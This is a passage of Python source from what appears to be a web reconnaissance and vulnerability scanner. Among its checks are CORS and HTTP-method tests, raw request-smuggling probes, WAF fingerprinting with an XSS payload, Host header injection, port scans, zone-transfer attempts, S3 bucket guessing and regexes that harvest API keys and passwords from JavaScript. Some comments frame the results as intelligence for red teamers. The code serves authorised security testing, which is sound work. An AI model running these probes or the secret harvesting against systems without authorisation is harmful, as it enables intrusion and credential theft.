        )
        if sub_resp:
            sub_acao = sub_resp.headers.get("Access-Control-Allow-Origin", "")
            sub_acac = sub_resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            if sub_acao == sub_origin and sub_acac == "true":
                alert(
                    "CORS BYPASS: SUBDOMAIN WILDCARD TRUST + CREDENTIALS",
                    "HIGH",
                    domain,
                    f"Server reflects subdomain origin '{sub_acao}' with Allow-Credentials: true — "
                    f"any compromised or attacker-controlled subdomain of '{root}' can steal "
                    f"session cookies cross-origin"
                )
                print(timestamp() + f" [!] CORS subdomain wildcard bypass on {domain}: {sub_acao}")

    except Exception as e:
        print_error("check_cors_misconfiguration failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# Dangerous HTTP method testing
# ─────────────────────────────────────────────

# Methods beyond GET/POST/HEAD that servers should not accept on web endpoints.
# TRACE enables XST (cross-site tracing) cookie theft.
# PUT/DELETE allow file creation/deletion if misconfigured.
# CONNECT can be abused as an open proxy.
_DANGEROUS_METHODS = ["TRACE", "PUT", "DELETE", "CONNECT", "PATCH"]

_dangerous_method_checked = set()

def check_dangerous_http_methods(base_url, domain):
    """
    Send each dangerous HTTP method to the root path and flag any that return
    a 2xx or 405 response (405 = Method Not Allowed confirms the server
    processes the method even if it rejects it for this path).

    Severities:
      TRACE                → HIGH  (enables XST — credentials readable cross-origin)
      PUT / DELETE         → HIGH  (file write/delete if misconfigured)
      CONNECT              → MEDIUM (potential open-proxy abuse)
      PATCH                → LOW   (generally low risk unless write access confirmed)
    """
    if base_url in _dangerous_method_checked:
        return
    _dangerous_method_checked.add(base_url)

    _method_severity = {
        "TRACE":   "HIGH",
        "PUT":     "HIGH",
        "DELETE":  "HIGH",
        "CONNECT": "MEDIUM",
        "PATCH":   "LOW",
    }

    for method in _DANGEROUS_METHODS:
        try:
            stealth_delay(domain)
            resp = _get_session().request(
                method,
                base_url,
                headers=create_request_header(),
                timeout=6,
                allow_redirects=False,
                verify=False,
            )
            # 2xx = method accepted; 405 = server acknowledged it but rejected for this path.
            # Either indicates the server is processing the method.
            # 501 = not implemented (server actively refuses) — not reportable.
            if resp.status_code in range(200, 300):
                severity = _method_severity.get(method, "LOW")
                alert(
                    f"DANGEROUS HTTP METHOD ACCEPTED: {method}",
                    severity,
                    domain,
                    f"{method} {base_url} returned {resp.status_code} — "
                    f"server accepted the request"
                )
                print(timestamp() + f" [!] {method} accepted on {base_url} ({resp.status_code})")
            elif resp.status_code == 405:
                # 405 is a weaker signal — server parsed the method but denied it.
                # Only flag TRACE here since XST risk is confirmed even with 405
                # (some frameworks reflect headers before sending 405).
                if method == "TRACE":
                    alert(
                        "DANGEROUS HTTP METHOD: TRACE ENABLED (405)",
                        "MEDIUM",
                        domain,
                        f"TRACE {base_url} returned 405 — server parsed the TRACE request; "
                        f"verify whether response headers are reflected (XST risk)"
                    )
                    print(timestamp() + f" [!] TRACE 405 on {base_url} — possible XST risk")
        except Exception as e:
            print_error(f"check_dangerous_http_methods: {method} {base_url}: {e}")


# ─────────────────────────────────────────────
# HTTP request smuggling detection
# ─────────────────────────────────────────────

_smuggling_tested: set = set()


def _smuggling_raw_send(host: str, port: int, use_ssl: bool,
                        raw: bytes, timeout: int = 10) -> tuple:
    """
    Open a raw TCP (or TLS) socket, send `raw`, and read the response.
    Returns (response_bytes, timed_out).  Never raises — exceptions are
    caught and treated as (b"", False).
    """
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        sock.sendall(raw)
        buf = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                # Stop once headers + a small body have arrived — we don't
                # need the full response, just enough to read the status line.
                if b"\r\n\r\n" in buf and len(buf) > 512:
                    break
        except socket.timeout:
            return buf, True   # timeout while reading → server is waiting
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return buf, False
    except socket.timeout:
        return b"", True
    except Exception:
        return b"", False


def _smuggling_status(response_bytes: bytes) -> int:
    """Parse the HTTP status code from a raw response, or 0 on failure."""
    try:
        first_line = response_bytes.split(b"\r\n", 1)[0]
        return int(first_line.split(b" ", 2)[1])
    except Exception:
        return 0


def check_http_smuggling(base_url: str, domain: str) -> None:
    """
    Probe the target host for CL.TE, TE.CL, and TE.TE request smuggling
    desync vulnerabilities using raw socket connections.

    Detection is timing- and status-based only — no queue poisoning, no
    attempt to affect other users.  All findings are MEDIUM and require
    manual confirmation with Burp Suite's HTTP Request Smuggler.

    Only runs when --active-probes is enabled. Deduplicates per host.
    10-second socket timeout per probe.
    """
    parsed   = urlparse(base_url)
    host     = parsed.hostname or domain
    use_ssl  = parsed.scheme == "https"
    port     = parsed.port or (443 if use_ssl else 80)
    dedup_key = f"{host}:{port}"

    if dedup_key in _smuggling_tested:
        return
    _smuggling_tested.add(dedup_key)

    # Helper: build a minimal raw HTTP/1.1 POST request
    def _build(extra_headers: dict, body: bytes) -> bytes:
        hdrs  = f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        for k, v in extra_headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += "Connection: close\r\n\r\n"
        return hdrs.encode() + body

    # ── Baseline: a normal POST so we know what a clean response looks like ──
    baseline_raw  = _build({"Content-Length": "0"}, b"")
    baseline_resp, baseline_timeout = _smuggling_raw_send(
        host, port, use_ssl, baseline_raw, timeout=10)
    baseline_status = _smuggling_status(baseline_resp)

    # If baseline itself timed out the host is too slow to probe reliably.
    if baseline_timeout:
        return

    def _flag(technique: str, detail: str) -> None:
        alert(
            f"HTTP REQUEST SMUGGLING — {technique}",
            "MEDIUM",
            base_url,
            detail + (
                f"  Technique: {technique}. "
                f"Confirm exploitability with Burp Suite HTTP Request Smuggler "
                f"before reporting."
            )
        )
        print(timestamp() + f" [!] HTTP smuggling signal ({technique}): {host}:{port}")

    # ── CL.TE — front-end honours Content-Length, back-end honours TE ────────
    # Body: "0\r\n\r\nX" = 5 bytes, but CL=6 so front-end forwards all 6;
    # back-end (chunked) reads "0\r\n\r\n" as end-of-body, then "X" is left
    # in the pipeline — the back-end stalls waiting for the next request line.
    cl_te_body = b"0\r\n\r\nX"
    cl_te_raw  = _build({
        "Content-Length":    str(len(cl_te_body) + 1),   # deliberately off by 1
        "Transfer-Encoding": "chunked",
    }, cl_te_body)
    cl_te_resp, cl_te_timeout = _smuggling_raw_send(
        host, port, use_ssl, cl_te_raw, timeout=10)
    cl_te_status = _smuggling_status(cl_te_resp)

    if cl_te_timeout or cl_te_status in (400, 408):
        _flag("CL.TE",
              f"Server at {host}:{port} {'timed out' if cl_te_timeout else f'returned {cl_te_status}'} "
              f"on a request with Content-Length={len(cl_te_body) + 1} and "
              f"Transfer-Encoding: chunked with body '0\\r\\n\\r\\nX' — "
              f"possible CL.TE desync: front-end may use Content-Length while "
              f"back-end uses Transfer-Encoding.  ")

    # ── TE.CL — front-end honours TE, back-end honours Content-Length ────────
    # Valid chunked body: 8-byte chunk "SMUGGLED" then terminator.
    # CL=3 tells a CL-based back-end to read only 3 bytes ("8\r\n"),
    # leaving the remainder in the pipeline.
    te_cl_body = b"8\r\nSMUGGLED\r\n0\r\n\r\n"
    te_cl_raw  = _build({
        "Content-Length":    "3",
        "Transfer-Encoding": "chunked",
    }, te_cl_body)
    te_cl_resp, te_cl_timeout = _smuggling_raw_send(
        host, port, use_ssl, te_cl_raw, timeout=10)
    te_cl_status = _smuggling_status(te_cl_resp)

    if te_cl_timeout or te_cl_status in (400, 408):
        _flag("TE.CL",
              f"Server at {host}:{port} {'timed out' if te_cl_timeout else f'returned {te_cl_status}'} "
              f"on a request with Content-Length=3 and Transfer-Encoding: chunked "
              f"with body '8\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n' — "
              f"possible TE.CL desync: front-end may use Transfer-Encoding while "
              f"back-end uses Content-Length.  ")

    # ── TE.TE obfuscation — one layer processes, the other ignores the header ─
    # For each variant, send a well-formed chunked body; if the server times out
    # or errors when it previously responded cleanly to the baseline, the
    # obfuscated header confused one layer.
    _TE_VARIANTS = [
        ("xchunked",          "Transfer-Encoding: xchunked"),
        ("chunked (duplicate)", "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked"),
        ("trailing-space",    "Transfer-Encoding: chunked "),
        ("CHUNKED (caps)",    "Transfer-Encoding: CHUNKED"),
        ("x (invalid)",       "Transfer-Encoding: x"),
    ]
    # A minimal valid chunked body — nothing ambiguous in the body itself.
    te_body = b"0\r\n\r\n"

    for variant_name, raw_te_header in _TE_VARIANTS:
        # Build the raw request manually so we can inject multi-line or
        # malformed TE headers that requests.Session would strip/normalise.
        raw_req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{raw_te_header}\r\n"
            f"Content-Length: {len(te_body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + te_body

        resp_bytes, timed_out = _smuggling_raw_send(
            host, port, use_ssl, raw_req, timeout=10)
        status = _smuggling_status(resp_bytes)

        # Flag only if the result differs meaningfully from the clean baseline:
        # baseline was non-error and this probe timed out or produced 400/408.
        if (timed_out or status in (400, 408)) and baseline_status not in (400, 408):
            _flag(f"TE.TE ({variant_name})",
                  f"Server at {host}:{port} {'timed out' if timed_out else f'returned {status}'} "
                  f"on Transfer-Encoding obfuscation variant '{variant_name}' "
                  f"(baseline status: {baseline_status}) — "
                  f"possible TE.TE desync: the obfuscated header may be processed "
                  f"by one layer and ignored by another.  ")
            break  # one TE.TE signal per host is sufficient


# ─────────────────────────────────────────────
# WAF / security appliance fingerprinting
# ─────────────────────────────────────────────

_waf_checked = set()
_waf_results: dict = {}   # domain → detected vendor string (populated by detect_waf)

# Signature sets: headers, cookie name prefixes, server header fragments, body snippets
WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "cookies": [],
        "server":  ["cloudflare"],
        "body":    ["Attention Required! | Cloudflare", "cf-error-details"],
    },
    "Akamai": {
        "headers": ["x-check-cacheable", "x-akamai-transformed", "x-akamai-request-id"],
        "cookies": [],
        "server":  ["akamaighost", "akamai"],
        "body":    ["Reference&#32;&#35;", "Reference #", "Akamai"],
    },
    "Imperva Incapsula": {
        "headers": ["x-iinfo"],
        "cookies": ["visid_incap_", "incap_ses_"],
        "server":  ["incapsula"],
        "body":    ["Incapsula incident", "_Incapsula_Resource_"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid"],
        "cookies": ["awsalb", "awsalbcors"],
        "server":  [],
        "body":    ["AWS WAF", "Request blocked"],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "cookies": [],
        "server":  ["sucuri/cloudproxy", "sucuri"],
        "body":    ["Sucuri WebSite Firewall", "sucuri-nginxproxy"],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-wa-info"],
        "cookies": ["ts", "f5_cspm", "f5avr", "bigipserver"],
        "server":  ["bigip", "big-ip", "f5 big-ip"],
        "body":    ["The requested URL was rejected", "Please consult with your administrator"],
    },
    "Barracuda": {
        "headers": [],
        "cookies": ["barra_counter_session"],
        "server":  [],
        "body":    ["You have been blocked", "Barracuda Networks"],
    },
    "Wordfence": {
        "headers": [],
        "cookies": [],
        "server":  [],
        "body":    ["generated by Wordfence", "wordfence.com/"],
    },
    "ModSecurity": {
        "headers": ["x-mod-security-message"],
        "cookies": [],
        "server":  [],
        "body":    ["ModSecurity", "mod_security", "This error was generated by Mod_Security"],
    },
    "Fortinet FortiWeb": {
        "headers": [],
        "cookies": ["FORTIWAFSID"],
        "server":  ["fortiweb"],
        "body":    ["FortiWeb", "FortiGate"],
    },
    "Reblaze": {
        "headers": ["x-reblaze-protection"],
        "cookies": ["rbzid"],
        "server":  [],
        "body":    [],
    },
}

def detect_waf(base_url, domain):
    """
    Passive + light-active WAF fingerprinting.

    Pass 1 (passive): inspect headers and cookies from the normal homepage
    response for known WAF signatures.

    Pass 2 (active): send a request with an obviously malicious payload
    (classic XSS string) and inspect the response. WAFs typically return
    403/406/429/503 with a distinctive error page. Compare headers/body
    against signatures.

    Findings are stored in the WAF table and printed as informational context.
    No alert is raised — WAF presence is not a vulnerability, but it's
    critical intelligence for a red teamer (determines viable techniques).
    """
    if domain in _waf_checked:
        return
    _waf_checked.add(domain)

    detected = {}   # vendor → list of evidence strings

    def _check_response(resp, label):
        if not resp:
            return
        header_keys = {k.lower() for k in resp.headers}
        header_vals = " ".join(resp.headers.values()).lower()
        body_snip   = resp.text[:3000].lower() if resp.text else ""
        cookies_str = " ".join(
            c.lower() for c in resp.headers.get("Set-Cookie", "").split(";")
        )
        server = resp.headers.get("Server", "").lower()

        for vendor, sigs in WAF_SIGNATURES.items():
            evidence = []
            for h in sigs["headers"]:
                if h in header_keys:
                    evidence.append(f"header:{h}")
            for c in sigs["cookies"]:
                if c in cookies_str:
                    evidence.append(f"cookie:{c}")
            for s in sigs["server"]:
                if s in server:
                    evidence.append(f"server:{s}")
            for b in sigs["body"]:
                if b.lower() in body_snip:
                    evidence.append(f"body-match")
            if evidence:
                if vendor not in detected:
                    detected[vendor] = []
                detected[vendor].extend([f"{label}:{e}" for e in evidence])

    try:
        # Pass 1 — normal request
        r1 = safe_get(base_url, timeout=8)
        _check_response(r1, "normal")

        # Pass 2 — WAF-triggering request (XSS payload in a query param)
        probe_url = base_url.rstrip("/") + "/?waf_probe=<script>alert(1)</script>"
        r2 = _get_session().get(probe_url, headers=create_request_header(),
                          timeout=6, allow_redirects=True)
        _check_response(r2, "probe")

    except Exception as e:
        print_error(f"WAF detection failed for {domain}: {e}")
        return

    if detected:
        for vendor, evidence in detected.items():
            ev_str = ", ".join(dict.fromkeys(evidence))  # dedup, preserve order
            print(timestamp() + f" WAF detected on {domain}: {vendor} ({ev_str})")
            write_to_waf_database(domain, vendor, ev_str)
            _waf_results[domain] = vendor   # cache for per-page injection checks
    else:
        print(timestamp() + f" No WAF detected on {domain}")

def _response_waf_provider(resp):
    """
    Inspect an HTTP response for WAF fingerprints.
    Returns the WAF provider name string if detected, or None if clean.

    Covers:
      - Akamai:             edgesuite.net in headers or body
      - Incapsula/Imperva:  Incapsula incident or _Incapsula_Resource_ in body,
                            or x-iinfo header
      - Cloudflare:         cf-ray / cf-cache-status header, or
                            "cloudflare" in Server header or body
    """
    if resp is None:
        return None
    header_keys  = {k.lower() for k in resp.headers}
    header_vals  = " ".join(v.lower() for v in resp.headers.values())
    body         = (resp.text or "")[:4000].lower()

    # Akamai
    if "edgesuite.net" in header_vals or "edgesuite.net" in body:
        return "Akamai"

    # Incapsula / Imperva
    if "x-iinfo" in header_keys:
        return "Incapsula/Imperva"
    if "incapsula incident" in body or "_incapsula_resource_" in body:
        return "Incapsula/Imperva"

    # Cloudflare
    if "cf-ray" in header_keys or "cf-cache-status" in header_keys:
        return "Cloudflare"
    server = resp.headers.get("Server", "").lower()
    if "cloudflare" in server or "cloudflare" in body:
        return "Cloudflare"

    return None

def _response_waf_provider_from_text(body_text):
    """
    Same WAF fingerprinting as _response_waf_provider() but works on a plain
    HTML string when no requests.Response object is available (e.g. SSRF page body).
    """
    if not body_text:
        return None
    body = body_text[:4000].lower()
    if "edgesuite.net" in body:
        return "Akamai"
    if "incapsula incident" in body or "_incapsula_resource_" in body:
        return "Incapsula/Imperva"
    if "cloudflare" in body:
        return "Cloudflare"
    return None

def _is_akamai_block(resp):
    """Legacy shim — use _response_waf_provider() for new code."""
    return _response_waf_provider(resp) == "Akamai"

def write_to_waf_database(domain, waf_vendor, detected_by):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WAF")
        existing = conn.execute(
            "SELECT domain FROM WAF WHERE domain=? AND waf_vendor=? LIMIT 1",
            (domain, waf_vendor)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO WAF (domain,waf_vendor,detected_by,found_at) VALUES (?,?,?,?)",
                (domain, waf_vendor, detected_by, timestamp()))
    except Exception as e:
        print_error("write_to_waf_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# /.well-known/ enumeration
# ─────────────────────────────────────────────

_well_known_checked = set()

WELL_KNOWN_PATHS = [
    # Security contact / disclosure policy — OSINT goldmine
    ("/.well-known/security.txt",               "osint"),
    # OpenID Connect discovery — exposes full OAuth/OIDC surface
    ("/.well-known/openid-configuration",        "auth"),
    # OAuth 2.0 authorisation server metadata (RFC 8414)
    ("/.well-known/oauth-authorization-server",  "auth"),
    # JSON Web Key Set — public keys used to verify JWTs
    ("/.well-known/jwks.json",                   "auth"),
    # Password change endpoint hint (RFC 8615)
    ("/.well-known/change-password",             "info"),
    # Apple Universal Links / Android App Links
    ("/.well-known/apple-app-site-association",  "info"),
    ("/.well-known/assetlinks.json",             "info"),
]

def check_well_known(base_url, domain):
    """
    Probe standard /.well-known/ paths.

    security.txt      — OSINT: contact names, PGP keys, disclosure policy URL,
                        bug bounty scope. Confirm with RFC 9116 field names.
    openid-configuration / oauth-authorization-server
                      — Exposes the full OAuth/OIDC surface: token_endpoint,
                        authorization_endpoint, supported grant types, JWKS URI.
                        Alerts HIGH — gives a red teamer the complete auth map.
    jwks.json         — Public keys for JWT verification. Informational.
    Others            — Logged if present; content snippet stored.
    """
    if domain in _well_known_checked:
        return
    _well_known_checked.add(domain)

    for path, category in WELL_KNOWN_PATHS:
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = _get_session().get(url, headers=create_request_header(),
                                timeout=6, allow_redirects=False)
            if not resp or resp.status_code not in (200, 206):
                continue

            body = resp.text
            content_type = resp.headers.get("Content-Type", "").lower()

            # ── security.txt ─────────────────────────────────
            if "security.txt" in path:
                # Confirm it's a real security.txt (RFC 9116 fields)
                if not any(f in body for f in ("Contact:", "Expires:", "Encryption:")):
                    continue
                # Extract key fields for the snippet
                fields = {}
                for line in body.splitlines():
                    for field in ("Contact", "Expires", "Encryption", "Policy", "Acknowledgments", "Preferred-Languages"):
                        if line.startswith(field + ":"):
                            fields[field] = line.split(":", 1)[1].strip()
                snippet = "; ".join(f"{k}: {v}" for k, v in list(fields.items())[:4])
                print(timestamp() + f" security.txt found on {domain}: {snippet}")
                write_to_well_known_database(domain, path, category, snippet[:500])
                continue

            # ── OpenID Connect / OAuth discovery ─────────────
            if category == "auth":
                if "json" not in content_type and "{" not in body[:10]:
                    continue
                try:
                    data = json.loads(body)
                except Exception:
                    continue
                # Extract useful endpoints for the snippet
                keys_of_interest = [
                    "issuer", "authorization_endpoint", "token_endpoint",
                    "userinfo_endpoint", "jwks_uri", "grant_types_supported",
                    "response_types_supported",
                ]
                snippet_parts = []
                for k in keys_of_interest:
                    if k in data:
                        v = data[k]
                        snippet_parts.append(f"{k}: {v if not isinstance(v, list) else ', '.join(v[:3])}")
                snippet = "; ".join(snippet_parts[:5])
                alert(
                    "OPENID/OAUTH DISCOVERY ENDPOINT EXPOSED",
                    "HIGH",
                    domain,
                    f"{url} exposes OAuth/OIDC surface — {snippet[:300]}"
                )
                print(timestamp() + f" [!] OpenID/OAuth config exposed: {url}")
                write_to_well_known_database(domain, path, category, snippet[:500])
                continue

            # ── jwks.json ────────────────────────────────────
            if "jwks" in path:
                if "{" not in body[:10]:
                    continue
                try:
                    data = json.loads(body)
                    key_count = len(data.get("keys", []))
                except Exception:
                    key_count = 0
                snippet = f"JWKS endpoint: {key_count} key(s) exposed"
                print(timestamp() + f" JWKS found on {domain}: {snippet}")
                write_to_well_known_database(domain, path, category, snippet)
                continue

            # ── Everything else ──────────────────────────────
            snippet = body[:300].strip()
            print(timestamp() + f" /.well-known{path.split('well-known')[1]} found on {domain}")
            write_to_well_known_database(domain, path, category, snippet)

        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"check_well_known probe failed for {url}: {e}")

def write_to_well_known_database(domain, path, category, content_snippet):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "WellKnown")
        existing = conn.execute(
            "SELECT domain FROM WellKnown WHERE domain=? AND path=? LIMIT 1",
            (domain, path)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO WellKnown (domain,path,category,content_snippet,found_at) VALUES (?,?,?,?,?)",
                (domain, path, category, content_snippet, timestamp()))
    except Exception as e:
        print_error("write_to_well_known_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Host header injection detection
# ─────────────────────────────────────────────

_host_header_checked = set()

def check_host_header_injection(base_url, domain):
    """
    Test for Host header injection by sending requests with a unique canary
    value in Host, X-Forwarded-Host, X-Host, and X-Forwarded-Server headers.

    A vulnerable server will reflect the injected host into:
      - Response body (links, form actions, meta refresh, canonical URLs)
      - Location header (redirect destination)
      - Any other response header (Content-Location, Link, etc.)

    This is commonly exploited to poison password-reset links, cache entries,
    and internal service routing. Alerts HIGH on confirmed reflection.
    """
    if domain in _host_header_checked:
        return
    _host_header_checked.add(domain)

    import uuid as _uuid
    canary = f"hhiprobe-{_uuid.uuid4().hex[:12]}.example.com"

    # Headers to test — each pass injects one header at a time so we know
    # which header the server is trusting.
    injection_headers = [
        ("X-Forwarded-Host",   canary),
        ("X-Host",             canary),
        ("X-Forwarded-Server", canary),
        ("X-Original-Host",    canary),
    ]

    base_headers = create_request_header()

    for header_name, header_value in injection_headers:
        test_headers = {**base_headers, header_name: header_value}
        try:
            stealth_delay(domain)
            resp = _get_session().get(
                base_url,
                headers=test_headers,
                timeout=8,
                allow_redirects=False,
            )
        except Exception as e:
            print_error(f"Host header injection probe failed ({header_name}) for {domain}: {e}")
            continue

        reflected_in = []

        # Check response body
        body = resp.text[:50000]
        if canary in body:
            reflected_in.append("response body")

        # Check all response headers
        for h_name, h_val in resp.headers.items():
            if canary in h_val:
                reflected_in.append(f"response header {h_name}")

        if reflected_in:
            where = ", ".join(reflected_in)
            alert(
                "HOST HEADER INJECTION",
                "HIGH",
                base_url,
                f"Server reflects injected '{header_name}: {canary}' in {where}. "
                f"Exploitable for password-reset poisoning, cache poisoning, SSRF."
            )
            print(timestamp() + f" [!!] Host header injection via {header_name} on {domain}")
            return   # One confirmed finding per domain is enough


# ─────────────────────────────────────────────
# Domain enrichment
# ─────────────────────────────────────────────

def base_url_for(domain_or_url):
    """Return scheme://host for a domain or full URL."""
    parsed = urlparse(domain_or_url)
    if parsed.scheme:
        return parsed.scheme + "://" + parsed.netloc
    return "https://" + domain_or_url

def enrich_domain(domain_name, response_headers=None, html_content=None):
    clean_domain = sanitize_url(str(domain_name))
    try:
        resp = safe_get(domain_name, method="head")
        if resp:
            record_http_response(domain_name, resp.status_code)
            server       = resp.headers.get('Server', 'Unknown')
            content_type = resp.headers.get('Content-Type', 'Unknown')
            # Security header analysis on every new domain
            analyze_security_headers(clean_domain, dict(resp.headers))
        else:
            server = content_type = 'Unknown'

        rate_limit()
        title = grab_title(domain_name)
        rate_limit()

        try:
            ip = socket.gethostbyname(clean_domain)
        except socket.gaierror:
            ip = 'Unknown'

        # ASN lookup — identifies CDNs, hosting providers, and org ownership
        asn_info = asn_lookup(ip)

        # ── Parallel passive recon: reverse DNS + ASN prefix enumeration ──
        # Both are non-vulnerability checks that extend IP → hostname and
        # org → prefix visibility.  Run concurrently so neither blocks the other.
        from concurrent.futures import ThreadPoolExecutor as _PTRE, as_completed as _pac
        _pfuts = {}
        with _PTRE(max_workers=2) as _pex:
            if ip and ip != "Unknown":
                _pfuts[_pex.submit(reverse_dns_lookup, ip)] = "ptr"
            if asn_info and asn_info.get("asn"):
                _pfuts[_pex.submit(
                    enumerate_asn_prefixes,
                    asn_info["asn"], asn_info.get("org", "")
                )] = "asn_prefixes"
            for _pf in _pac(_pfuts):
                pass

        # Fingerprint technologies from headers + HTML (HTML optional).
        # Always call so header-only signals (X-Powered-By, cookies) are caught
        # even when the crawl loop doesn't provide html_content.
        _fp_headers = response_headers or (dict(resp.headers) if resp else {})
        detected_techs = fingerprint_technologies(
            domain_name, _fp_headers, html_content or "")

        # ── Parallel I/O: DNS, SSL, WHOIS, port scan ─────────────
        from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _ac
        _network_tasks = [
            dns_lookup,
            mx_lookup,
            attempt_zone_transfer,
            get_ssl_info,
            get_whois_info,
            port_scan,
            check_tls_config,
        ]
        with _TPE(max_workers=len(_network_tasks)) as _ex:
            _futs = {_ex.submit(fn, clean_domain): fn for fn in _network_tasks}
            for _f in _ac(_futs):
                pass

        # ── Parallel subdomain discovery ──────────────────────────
        with _TPE(max_workers=2) as _ex:
            _futs = [
                _ex.submit(enumerate_subdomains, clean_domain),
                _ex.submit(query_ct_logs, clean_domain),
            ]
            for _f in _ac(_futs):
                pass

        # ── Exposure checks — parallel, once per base URL ─────────
        base = base_url_for(domain_name)
        if base not in _exposure_checked:
            _exposure_checked.add(base)
            _exposure_tasks = [
                (check_git_exposure,           (base, clean_domain)),
                (check_env_exposure,           (base, clean_domain)),
                (check_directory_listing,      (base, clean_domain)),
                (check_backup_exposure,        (base, clean_domain)),
                (check_actuator_exposure,      (base, clean_domain)),
                (check_sensitive_files,        (base, clean_domain)),
                (detect_waf,                        (base, clean_domain)),
                (check_well_known,                  (base, clean_domain)),
                (check_host_header_injection,       (base, clean_domain)),
                (check_admin_panels,                (base, clean_domain)),
                (check_security_headers,            (base, clean_domain)),
            ]
            # Technology-specific checks — run when fingerprinting detected a known stack
            if detected_techs:
                _exposure_tasks.append(
                    (check_technology_specific, (base, clean_domain, detected_techs))
                )
            # Active probe checks — only run when --active-probes is enabled
            if ACTIVE_PROBES:
                _exposure_tasks += [
                    (check_graphql_introspection,    (base, clean_domain)),
                    (check_cors_misconfiguration,    (base, clean_domain)),
                    (check_default_credentials,      (base, clean_domain)),
                    (check_dangerous_http_methods,   (base, clean_domain)),
                    (check_http_smuggling,           (base, clean_domain)),
                ]
            with _TPE(max_workers=8) as _ex:
                _futs = {_ex.submit(fn, *args): fn for fn, args in _exposure_tasks}
                for _f in _ac(_futs):
                    pass

        # SPF/DMARC — DNS-based, run once per root domain
        check_spf_dmarc(clean_domain)

        # S3 permutation scan — guesses common bucket names from the root domain
        probe_s3_permutations(clean_domain)

        write_to_domain_database(str(domain_name), ip, server, content_type, title)

    except Exception as err:
        print_error("enrich_domain failed for " + domain_name + ": " + str(err))



# ─────────────────────────────────────────────
# JS bundle analysis
# ─────────────────────────────────────────────

# Track which JS files have already been analysed this session
_js_analysed = set()

# Patterns for extracting findings from JS bundles
JS_ENDPOINT_PATTERNS = [
    r"""[\"'`](/(?:api|v\d|graphql|rest|internal|admin|backend)[^\s\"'`<>{}\[\]]{2,100})""",
    r"""[\"'`](https?://[a-zA-Z0-9._/-]+/(?:api|v\d|graphql)[^\s\"'`<>{}\[\]]{0,100})""",
    r"""(?:url|endpoint|path|route|baseURL|apiUrl)\s*[:=]\s*[\"'`](/[^\s\"'`<>]{2,80})""",
]

# Domains whose endpoints are always public/noise — mapping tiles, CDNs,
# analytics, fonts, etc. Endpoints from these hosts are never worth storing.
ENDPOINT_NOISE_DOMAINS = {
    # Mapping / GIS
    "arcgisonline.com", "arcgis.com", "js.arcgis.com",
    "maps.googleapis.com", "maps.google.com",
    "api.mapbox.com", "events.mapbox.com",
    "tile.openstreetmap.org", "nominatim.openstreetmap.org",
    # Google services
    "googleapis.com", "googletagmanager.com", "google-analytics.com",
    "googleadservices.com", "googlesyndication.com", "google.com",
    "gstatic.com", "fonts.gstatic.com", "fonts.googleapis.com",
    # Meta / social tracking
    "facebook.com", "connect.facebook.net", "graph.facebook.com",
    "platform.twitter.com", "syndication.twitter.com",
    # CDNs and asset hosts
    "cloudflare.com", "cloudfront.net", "fastly.net",
    "cdn.jsdelivr.net", "cdnjs.cloudflare.com",
    "unpkg.com", "jsdelivr.net",
    # Analytics / monitoring
    "segment.io", "segment.com", "amplitude.com",
    "hotjar.com", "fullstory.com", "logrocket.com",
    "newrelic.com", "nr-data.net", "sentry.io",
    "datadog-browser-agent.com", "datadoghq.com",
    # Marketing / CRM
    "hubspot.com", "hubapi.com", "hs-scripts.com",
    "intercom.io", "intercomcdn.com",
    "marketo.net", "salesforce.com",
    # Payments (client-side SDKs only)
    "js.stripe.com", "checkout.stripe.com",
    # Auth SDKs
    "auth0.com", "cdn.auth0.com",
    "accounts.google.com", "appleid.apple.com",
}

def is_endpoint_noise(endpoint_str):
    """Return True if the endpoint belongs to a known public/noise domain."""
    try:
        parsed = urlparse(endpoint_str if endpoint_str.startswith("http")
                          else "https:" + endpoint_str)
        netloc = parsed.netloc.lower().lstrip("www.")
        for noise_domain in ENDPOINT_NOISE_DOMAINS:
            if netloc == noise_domain or netloc.endswith("." + noise_domain):
                return True
    except Exception:
        pass
    return False

JS_SECRET_PATTERNS = [
    (r'''(?i)(?:api[_-]?key|apikey|api[_-]?secret)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "api_key"),
    (r'''(?i)(?:secret[_-]?key|secret)\s*[:=]\s*["']([A-Za-z0-9_\-/+]{16,64})["']''', "secret"),
    (r'''(?i)(?:access[_-]?token|auth[_-]?token)\s*[:=]\s*["']([A-Za-z0-9_\-\.]{16,200})["']''', "token"),
    (r'''(?i)(?:password|passwd)\s*[:=]\s*["']([^"'\s\-][^"'\s]{7,63})["']''', "password"),
    (r'AKIA[0-9A-Z]{16}', "aws_access_key"),
    (r'''(?i)(?:private[_-]?key)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "private_key"),
    (r'''(?i)(?:client[_-]?secret)\s*[:=]\s*["']([A-Za-z0-9_\-]{16,64})["']''', "client_secret"),
